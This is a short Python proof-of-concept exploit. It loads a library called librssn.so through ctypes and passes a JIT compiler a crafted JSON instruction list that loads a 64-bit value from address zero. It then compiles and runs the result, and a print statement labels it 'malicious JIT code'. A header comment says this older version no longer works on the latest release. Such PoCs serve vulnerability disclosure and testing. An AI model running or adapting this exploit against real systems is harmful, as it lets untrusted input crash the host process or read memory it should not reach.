# This is the older version of the PoC, do not work on the latest version for the reason of args, not bugs.

import json
import ctypes

lib = ctypes.CDLL("./librssn.so")

engine = lib.rssn_jit_create()

malicious_payload = {
    "instructions": [
        {"ImmI": 0},
        {"Load": "I64"},
        {"Return": None}
    ]
}

json_data = json.dumps(malicious_payload).encode('utf-8')
func_ptr = lib.rssn_jit_compile_json(engine, json_data)

result = lib.rssn_jit_execute(func_ptr)
print(f"JIT execute results: {result}")

print("Attempting to execute malicious JIT code...")